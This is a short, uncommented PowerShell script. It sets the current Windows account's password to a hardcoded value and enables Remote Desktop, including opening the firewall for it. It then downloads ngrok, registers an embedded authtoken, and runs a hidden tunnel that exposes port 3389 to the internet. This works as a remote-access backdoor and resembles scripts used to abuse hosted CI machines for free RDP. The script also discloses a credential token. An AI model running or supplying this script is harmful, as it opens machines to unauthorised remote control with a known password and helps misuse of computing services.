[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-ExecutionPolicy Bypass -Scope Process -Force

$UserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[-1]
$PasswordPlain = "Develop1234"
$SecurePassword = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force

Set-LocalUser -Name $UserName -Password $SecurePassword -ErrorAction SilentlyContinue
Get-LocalUser -Name $UserName | Enable-LocalUser

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

$NgrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
$ZipFile = "$env:TEMP\ngrok.zip"

Invoke-WebRequest -Uri $NgrokUrl -OutFile $ZipFile -UseBasicParsing

Expand-Archive -Path $ZipFile -DestinationPath . -Force
Remove-Item -Path $ZipFile -Force

.\ngrok.exe config add-authtoken "3FXg3L4EvG25jxRWiRaZVNPi6Hu_4uaMokgmcJrry78mC8Luy"

Start-Process .\ngrok.exe -ArgumentList "tcp 3389" -WindowStyle Hidden

ping.exe -t 127.0.0.1
